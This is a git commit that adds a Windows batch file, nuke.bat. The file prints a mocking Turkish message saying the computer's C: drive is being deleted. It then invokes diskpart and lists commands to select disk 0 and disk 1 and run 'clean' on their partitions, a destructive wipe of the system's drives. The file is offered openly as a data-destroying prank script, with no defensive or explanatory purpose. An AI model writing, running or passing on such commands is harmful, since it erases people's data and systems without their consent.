999b66322fa1976ebcdfe94e77e7a17e1e7872d5
ruzgartvtr <ruzgarhunerel@gmail.com>
2025-05-14 19:59:52 +0300

    Add files via upload

---
+++ nuke.bat
@@ -0,0 +1,15 @@
+@echo off
+
+echo HAHAHA BİLGİSAYARIN C: SÜRÜCÜSÜ SİLİNİYOR BAYBAY HAHAHAHA BU ARADA GERÇEKTEN BOL ŞANS
+
+diskpart
+select disk 0
+select partition 1
+clean
+
+
+select disk 1
+select partition 1
+clean
+
+
